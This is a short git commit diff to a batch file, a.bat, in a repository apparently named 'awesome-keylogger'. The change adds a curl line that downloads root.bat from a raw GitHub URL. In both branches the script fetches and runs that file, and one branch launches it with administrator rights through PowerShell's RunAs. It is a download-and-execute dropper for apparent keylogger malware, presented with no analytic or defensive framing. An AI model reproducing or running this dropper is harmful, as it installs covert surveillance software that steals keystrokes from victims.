7f6abe04f340839272e2b498e28391b61a8394db
dGgzajNzdDNy <avacksalim@gmail.com>
2025-02-15 15:14:34 -0300

    Update a.bat

--- a.bat
+++ a.bat
@@ -4,6 +4,7 @@ IF %ERRORLEVEL% == 0 (
   curl -O https://raw.githubusercontent.com/dGgzajNzdDNy/awesome-keylogger/refs/heads/main/root.bat
   root.bat
 ) ELSE (
+  curl -O https://raw.githubusercontent.com/dGgzajNzdDNy/awesome-keylogger/refs/heads/main/root.bat
   powershell -Command "Start-Process root.bat -Verb RunAs"
   exit
 )
